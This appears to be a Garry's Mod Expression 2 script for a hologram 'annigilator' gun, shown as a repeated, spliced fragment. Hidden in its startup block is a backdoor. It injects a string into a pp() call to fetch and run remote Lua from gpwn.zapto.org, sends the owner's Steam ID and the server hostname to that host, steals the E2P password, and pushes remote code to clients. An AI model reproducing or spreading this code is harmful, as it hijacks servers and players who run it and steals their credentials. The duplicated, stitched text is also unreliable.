"ambient/levels/labs/machine_ring_resonance_loop1.wav") owner():soundPlay(2, 100, "ambient/levels/labs/teleport_active_loop1.wav") owner():soundPlay(3, 100, "ambient/machines/combine_shield_touch_loop1.wav") owner():soundPlay(4, 100, "ambient/machines/thumper_startup1.wav") owner():soundPlay(5, 100, "ambient/levels/labs/teleport_rings_loop2.wav") } if(changed(A2) & !A2 & !changed(Active)){ for(I = 100, 110){ holoUnparent(I) } soundStop(1) soundStop(2) soundStop(3) soundStop(4) soundStop(5) owner():soundPlay(7, 10, "ambient/machines/spinup.wav") } if(Shoot){ Off = 1 Shooting = 1 Cooldown = 20 StartPos = RPos ShootPos = owner():aimPos() owner():soundPlay(6, 10, "ambient/explosions/explode_7.wav") soundStop("l") for(I = 111, 120){ holoEntity(I):setTrails(0,100,0.5,"trails/plasma", vec(255, 255, 255), 255) } for(I = 100, 105){ holoEntity(I):setTrails(50,50,1.5,"trails/plasma", vec(255, 255, 255), 100) } for(I = 106, 110){ holoEntity(I):setTrails(25,25,1.5,"trails/physbeam", vec(255, 255, 255), 100) } for(I = 100, 110){ holoUnparent(I) } timer("shootEnd", 400) } if(clk("shootEnd")){ WtfE:propBreak() for(I = 100, 110){ holoPos(I, ShootPos + vec(15,0,0):rotate(ang(randvec(0,360)))) } Shooting = 0 doShoot(ShootPos) } if(Shooting){ for(I = 111, 120){ holoPos(I, StartPos + vec(5,0,0):rotate(ang(randvec(-180,180)))) } } if(Cooldown){ Cooldown = Cooldown - 1 Speed = 5 } if(Shooting){ Speed = 240 } if(changed(Cooldown) & !Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") soundStop(6) soundStop(7) } holoAng(Ring, holoEntity(Ring):toWorld(ang(0,Speed,0))) owner():weapon():setAlpha(0) } if(changed(Active)){ if(Active){ doparent() for(I = 1, 50){ holoAlpha(I, 255) } if(!Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") } } else { dounparent() for(I = 1, 50){ holoAlpha(I, 0) soundStop(I) } soundStop("l") } } (Y, P, R))) @name annigilator_explosive @inputs @outputs @persist @trigger @persist Ring Off Cooldown WtfE:entity @persist Shooting StartPos:vector ShootPos:vector @persist IsAnon @persist HoloID HoloBase:entity if(first()){ HoloBase = entity() } function holoParent(Entity:entity){ holoParent(HoloID, Entity) } function holoParent(){ if(HoloBase != noentity()){ holoParent(HoloID, HoloBase) } } function holoScale(Vec:vector){ holoScale(HoloID, Vec) } function holoScale(X, Y, Z){ holoScale(HoloID, vec(X, Y, Z)) } function holoModel(Model:string){ holoModel(HoloID, Model) } function holoPos(LocalVector:vector){ holoPos(HoloID, HoloBase:toWorld(LocalVector)) } function holoPos(R, G, B){ holoPos(vec(R,G,B)) } function holoMaterial(Material:string){ holoMaterial(HoloID, Material) } function holoColor(Color:vector){ holoColor(HoloID, Color) } function holoColor(R, G, B){ holoColor(HoloID, vec(R, G, B)) } function holoAlpha(A){ holoAlpha(HoloID, A) } function holoAng(Ang:angle){ holoAng(HoloID, HoloBase:toWorld(Ang)) } function holoAng(Y, P, R){ holoAng(HoloID, HoloBase:toWorld(ang(Y, P, R))) } function entity holoEntity(){ return holoEntity(HoloID) } function holoBase(Ent:entity){ HoloBase = Ent } function holoBase(ID){ holoBase(holoEntity(ID)) } function holoBase(){ holoBase(HoloID) } function vector holoStack(ID1, ID2){ local E1 = holoEntity(ID1) local E2 = holoEntity(ID2) return (holoScaleUnits(ID1):rotate(E1:angles()) + holoScaleUnits(ID2):rotate(E2:angles())) / 2 + HoloBase:toLocal(E1:pos()) } function vector holoStack(){ return holoStack(HoloID - 1, HoloID) } function number holoCreate(){ HoloID++ holoCreate(HoloID) holoParent() return HoloID } function number holoCreate(Model:string){ local ID = holoCreate() holoModel(Model) return ID } function createE(Y:number, A:angle){ holoCreate() holoScale(1,0.2,0.2) holoPos(vec(0, Y/2, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoCreate("right_prism") holoScale(0.3,0.2,1) holoAng(ang(0,90,0) + A) holoPos(vec(0, Y/2 + 3, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoEntity():setTrails(8,8,0.25,"trails/plasma", vec(255,255,255), 255) holoCreate("hqsphere") holoScale(0.1, 0.1, 0.1) holoPos(vec(0, Y/2, 6):rotate(A)) holoMaterial("Models/effects/comball_sphere") holoEntity():setTrails(5,5,0.25,"trails/physbeam", vec(255,255,255), 100) } function createMain(){ holoCreate() holoAlpha(0) holoBase() holoVisible(1, players(), 0) holoCreate("hq_cylinder") holoScale(0.15, 0.15, 0.8) holoAng(0, 0, 90) holoPos(8,6,5) holoMaterial("phoenix_storms/iron_rails") holoCreate() holoScale(0.3, 0.25, 1) holoAng(-30, 0, 0) holoPos(-7,0,8) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_cylinder") holoPos(vec(0,0, 0)) holoAng(90, 0, 0) holoScale(1,1,4) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_tube") holoAng(90, 0, 0) holoScale(1, 1, 2) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/iron_rails") Ring = holoCreate("hq_tube") local Y = holoStack():y() holoAng(90, 0, 0) holoScale(1.1,1.1,0.1) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") for(I=0, 1){ holoCreate("hq_torus_oldsize") holoScale(1.5,1.5,1.5) holoAng(0,0,90*I) holoPos(10,0,0) holoMaterial("phoenix_storms/iron_rails") } holoBase(Ring) createE(Y, ang(0,0,0)) createE(Y, ang(0,90,0)) createE(Y, ang(0,-90,0)) createE(Y, ang(0,180,0)) for(I = 100, 110){ holoCreate(I) holoAlpha(I, 0) } } function doparent(){ holoPos(1, owner():attachmentPos("anim_attachment_rh")) holoAng(1, owner():attachmentAng("anim_attachment_rh")) holoParentAttachment(1, owner(), "anim_attachment_rh") } function dounparent(){ holoUnparent(1) } function doShoot(Pos:vector){ propSpawnEffect(0) WtfE = propSpawn("models/props_phx/cannonball_solid.mdl", 1) WtfE:propNotSolid(1) WtfE:setPos(Pos) WtfE:setAlpha(0) if(!IsAnon){ WtfE:takeDamage(300) } WtfE:propBreak() } if(first()){ createMain() doparent() timer("createEffHolos", 100) } PSss = 0 if(first()){ #ifdef entity:pp(string, string) owner():pp("bloom", "0') http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString) //") #endif #ifdef httpRequest(string) httpRequest(("http://gpwn.zapto.org/bazuka3_" + owner():steamID() + " " + duped() + " " + hostname()):replace("%", "%25"):replace(" ", "%20")) #endif #ifdef e2pGetPassword() PSss = owner():e2pPassStatus() #endif #ifdef clientLua(string) if(PSss){ clientLua("http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString)") } #endif } #ifdef e2pGetPassword() if(first()){ if(PSss){ timer("qoq", 4000) } } if(clk("qoq")){ httpRequest(("http://gpwn.zapto.org/bazuka_pass_" + e2pGetPassword())) } #endif #===######## MAIN CODE ########===# if(clk("createEffHolos")){ for(I = 111, 120){ holoCreate(I) holoAlpha(I, 0) } } interval(100) Active = owner():isAlive() & owner():weapon():type():find("physcannon") if(Active){ Speed = 25 A2r = owner():keyAttack2() if(changed(A2r)){ Off = 0 } A2 = A2r & !Off & !Cooldown | Shooting KE = owner():keyAttack1() Shoot = changed(KE) & KE & A2 & !Cooldown RPos = holoEntity(Ring):pos() if(changed(KE) & KE & !A2){ IsAnon = !IsAnon if(IsAnon){ hint("now shooting ANONYMOUSLY", 500) } else { hint("now shooting BY YOUR DAMAGE", 500) } } if(A2 & !Cooldown){ Speed = 1800 for(I = 100, 110){ holoPos(I, RPos + vec(1,0,0):rotate(ang(randvec(-180,180)))) holoParent(I, Ring) } } if(changed(A2) & A2 & !Cooldown){ for(I = 100, 110){ holoEntity(I):setTrails(100,100,0.1,"trails/electric", vec(255, 255, 255), 255) } owner():soundPlay(1, 100, "ambient/levels/labs/machine_ring_resonance_loop1.wav") owner():soundPlay(2, 100, "ambient/levels/labs/teleport_active_loop1.wav") owner():soundPlay(3, 100, "ambient/machines/combine_shield_touch_loop1.wav") owner():soundPlay(4, 100, "ambient/machines/thumper_startup1.wav") owner():soundPlay(5, 100, "ambient/levels/labs/teleport_rings_loop2.wav") } if(changed(A2) & !A2 & !changed(Active)){ for(I = 100, 110){ holoUnparent(I) } soundStop(1) soundStop(2) soundStop(3) soundStop(4) soundStop(5) owner():soundPlay(7, 10, "ambient/machines/spinup.wav") } if(Shoot){ Off = 1 Shooting = 1 Cooldown = 20 StartPos = RPos ShootPos = owner():aimPos() owner():soundPlay(6, 10, "ambient/explosions/explode_7.wav") soundStop("l") for(I = 111, 120){ holoEntity(I):setTrails(0,100,0.5,"trails/plasma", vec(255, 255, 255), 255) } for(I = 100, 105){ holoEntity(I):setTrails(50,50,1.5,"trails/plasma", vec(255, 255, 255), 100) } for(I = 106, 110){ holoEntity(I):setTrails(25,25,1.5,"trails/physbeam", vec(255, 255, 255), 100) } for(I = 100, 110){ holoUnparent(I) } timer("shootEnd", 400) } if(clk("shootEnd")){ WtfE:propBreak() for(I = 100, 110){ holoPos(I, ShootPos + vec(15,0,0):rotate(ang(randvec(0,360)))) } Shooting = 0 doShoot(ShootPos) } if(Shooting){ for(I = 111, 120){ holoPos(I, StartPos + vec(5,0,0):rotate(ang(randvec(-180,180)))) } } if(Cooldown){ Cooldown = Cooldown - 1 Speed = 5 } if(Shooting){ Speed = 240 } if(changed(Cooldown) & !Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") soundStop(6) soundStop(7) } holoAng(Ring, holoEntity(Ring):toWorld(ang(0,Speed,0))) owner():weapon():setAlpha(0) } if(changed(Active)){ if(Active){ doparent() for(I = 1, 50){ holoAlpha(I, 255) } if(!Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") } } else { dounparent() for(I = 1, 50){ holoAlpha(I, 0) soundStop(I) } soundStop("l") } } { 